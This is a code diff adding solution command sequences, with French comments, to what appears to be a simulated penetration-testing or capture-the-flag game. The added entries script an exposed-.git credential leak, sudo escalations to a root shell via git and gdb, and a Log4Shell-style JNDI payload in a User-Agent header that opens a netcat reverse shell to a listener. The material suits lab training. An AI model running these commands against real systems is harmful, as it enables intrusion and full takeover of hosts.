@@ -175,6 +175,20 @@ const SOLUTIONS = {
     "sudo vim -c ':!/bin/sh'",
     "cat /root/root.txt",
   ],
+  // RELIC : dépôt .git exposé -> historique de commits -> creds SSH retirées mais lisibles.
+  relic: [
+    "nmap 10.10.11.140", "curl http://10.10.11.140/", "curl http://10.10.11.140/.git/HEAD",
+    "git log 10.10.11.140", "git show 10.10.11.140 4d5e6f",
+    "ssh gkessler@10.10.11.140", { pw: true }, "cat user.txt", "sudo -l",
+    "sudo git -p help config", "!sh", "cat /root/root.txt",
+  ],
+  // ECHOLOG : injection JNDI façon Log4Shell (en-tête User-Agent) -> RCE via callback nc.
+  // `exit` d'abord car on n'attrape une reverse shell que depuis sa propre box.
+  echolog: [
+    "exit", "nmap 10.10.11.205", "curl http://10.10.11.205:8081/", "nc -lvnp 4444",
+    "curl -H 'User-Agent: ${jndi:ldap://10.10.14.1:1389/x;nc 10.10.14.1 4444 -e /bin/sh}' http://10.10.11.205:8081/api/status",
+    "cat user.txt", "sudo -l", "sudo gdb -nx -ex '!sh' -ex quit", "cat /root/root.txt",
+  ],
   axiom: [
     "nmap 10.10.11.244", "curl http://10.10.11.244:8080/", "curl http://10.10.11.244:8080/logs/latest.txt",
     "ssh cibuild@10.10.11.244", { pw: true }, "cat user.txt", "sudo -l", "id", "docker ps",
